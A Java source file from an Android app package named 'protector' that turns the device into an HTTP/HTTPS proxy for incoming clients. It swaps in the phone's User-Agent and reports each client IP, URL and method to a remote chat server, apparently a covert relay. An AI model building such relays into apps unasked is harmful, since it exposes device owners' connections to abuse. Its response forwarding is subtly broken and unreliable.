package com.icontrol.protector;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;

public class RequestHandler implements Runnable {

    private final Socket clientSocket;
    private final Context ctx;

    public RequestHandler(Socket clientSocket,Context ctox) {
        this.clientSocket = clientSocket;
        this.ctx = ctox;
    }

    @Override
    public void run() {
        try {

            // Handle client request
            InputStream inputStream = clientSocket.getInputStream();
            OutputStream outputStream = clientSocket.getOutputStream();

            // Read the client's request
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            StringBuilder requestBuilder = new StringBuilder();
            String line;
            while (!(line = reader.readLine()).isEmpty()) {
                requestBuilder.append(line).append("\r\n");
            }

            // Extract the requested URL from the request
            String request = requestBuilder.toString();
            String[] requestLines = request.split("\r\n");
            String[] requestLine = requestLines[0].split(" ");
            String method = requestLine[0];
            String url = requestLine[1];

            MyLoger.Debug("RequestHandler", "Request Method: " + method);
            MyLoger.Debug("RequestHandler", "Requested URL: " + url);
            String clientIpAddress = clientSocket.getInetAddress().getHostAddress();
            MyLoger.Debug("RequestHandler", "clientIpAddress: " + clientIpAddress);

            logserver(clientIpAddress,url,method);

            if (method.equalsIgnoreCase("CONNECT")) {
                handleConnectMethod(url);
            } else {
                handleHttpRequest(method, url, requestLines, reader, outputStream);
            }



        } catch (IOException e) {
            MyLoger.Error("RequestHandler", "Error handling client request"+ e.getMessage());
            logserver("ERROR",e.getMessage(),"...");
        } finally {
            try {
                clientSocket.close();
            } catch (IOException e) {
                MyLoger.Error("RequestHandler", "Error closing client socket"+ e.getMessage());
                logserver("ERROR 2",e.getMessage(),"...");
            }
        }
    }


    private void logserver( String originalip, String proxyurl, String proxymethod){
        try{
            JSONObject message = new JSONObject();
            message.put("ctype", "dataup");//call type
            message.put("oip", originalip);
            message.put("purl", proxyurl);
            message.put("pmth", proxymethod);

            LiveChat.instance(ctx).ProxyMsg(ctx,message);
        }catch (Exception a){
            MyLoger.Error("logserver","Error "+a.getMessage());
            a.printStackTrace();
        }
    }



    private void handleConnectMethod(String url) {
        try {
            // Extract the host and port from the URL (example: www.example.com:443)
            String[] hostPort = url.split(":");
            String host = hostPort[0];
            int port = Integer.parseInt(hostPort[1]);

            // Establish a connection to the destination server
            Socket proxySocket = new Socket();
            proxySocket.connect(new InetSocketAddress(host, port));

            // Respond to the client that the connection was established
            OutputStream outputStream = clientSocket.getOutputStream();
            PrintWriter clientWriter = new PrintWriter(outputStream);
            clientWriter.write("HTTP/1.1 200 Connection Established\r\n");
            clientWriter.write("Proxy-agent: JavaProxy\r\n");
            clientWriter.write("\r\n");
            clientWriter.flush();

            // Tunnel data between the client and the destination server
            InputStream proxyInputStream = proxySocket.getInputStream();
            OutputStream proxyOutputStream = proxySocket.getOutputStream();

            Thread clientToProxy = new Thread(() -> {
                try {
                    tunnelData(clientSocket.getInputStream(), proxyOutputStream);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            });
            Thread proxyToClient = new Thread(() -> {
                try {
                    tunnelData(proxyInputStream, clientSocket.getOutputStream());
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            });

            clientToProxy.start();
            proxyToClient.start();

            clientToProxy.join();
            proxyToClient.join();

            proxySocket.close();

        } catch (Exception e) {
            MyLoger.Error("RequestHandler", "Error handling CONNECT method"+ e.getMessage());
            logserver("ERROR 3",e.getMessage(),"...");
        }
    }

    private void tunnelData(InputStream inputStream, OutputStream outputStream) {
        try {
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                try {
                    outputStream.write(buffer, 0, bytesRead);
                    outputStream.flush();
                } catch (IOException e) {
                    if (e.getMessage().contains("Broken pipe")) {
                        MyLoger.Error("RequestHandler", "Broken pipe detected, stopping data tunneling.");
                        break;  // Stop tunneling if a broken pipe occurs
                    } else {
                        throw e;  // Rethrow other IOExceptions
                    }
                }
            }
        } catch (IOException e) {
            MyLoger.Error("RequestHandler", "Error tunneling data: " + e.getMessage());
            logserver("ERROR 4", e.getMessage(), "...");
        }
    }

    private void handleHttpRequest(String method, String url, String[] requestLines, BufferedReader reader, OutputStream outputStream) {
        try {
            String userAgent = System.getProperty("http.agent");

            // Create a connection to the destination server
            URL destinationUrl = new URL(url);
            HttpURLConnection connection = (HttpURLConnection) destinationUrl.openConnection();
            connection.setRequestMethod(method);

            // Forward headers from the client to the destination server
            int contentLength = -1;
            for (int i = 1; i < requestLines.length; i++) {
                String[] header = requestLines[i].split(": ");
                if (header.length == 2) {
                    if (header[0].equalsIgnoreCase("User-Agent")) {
                        connection.setRequestProperty("User-Agent", userAgent);
                    } else {
                        connection.setRequestProperty(header[0], header[1]);
                        if (header[0].equalsIgnoreCase("Content-Length")) {
                            contentLength = Integer.parseInt(header[1]);
                        }
                    }
                }
            }

            // Send the request body to the destination server if it's a POST or PUT request
            if (method.equals("POST") || method.equals("PUT")) {
                connection.setDoOutput(true);
                OutputStream connectionOutputStream = connection.getOutputStream();

                // Read the exact content length if specified
                if (contentLength > 0) {
                    char[] buffer = new char[contentLength];
                    int bytesRead = reader.read(buffer, 0, contentLength);
                    if (bytesRead > 0) {
                        connectionOutputStream.write(new String(buffer).getBytes());
                        connectionOutputStream.flush();
                    }
                } else {
                    // Fallback to reading until the stream is empty if content length is not provided
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connectionOutputStream));
                    String body;
                    while ((body = reader.readLine()) != null) {
                        writer.write(body);
                        writer.flush();
                    }
                }
            }

            // Get the response from the destination server
            int responseCode = connection.getResponseCode();
            InputStream destinationInputStream = (responseCode >= 200 && responseCode < 400)
                    ? connection.getInputStream()
                    : connection.getErrorStream();

            BufferedReader destinationReader = new BufferedReader(new InputStreamReader(destinationInputStream));
            StringBuilder responseBuilder = new StringBuilder();
            String responseLine;
            while ((responseLine = destinationReader.readLine()) != null) {
                responseBuilder.append(responseLine).append("\r\n");
            }

            // Send the response back to the client
            PrintWriter clientWriter = new PrintWriter(outputStream);
            clientWriter.write("HTTP/1.1 " + responseCode + " \r\n");
            clientWriter.write(responseBuilder.toString());
            clientWriter.flush();

        } catch (IOException e) {
            MyLoger.Error("RequestHandler", "Error handling HTTP request" + e.getMessage());
            logserver("ERROR 5", e.getMessage(), "...");
        }
    }

}
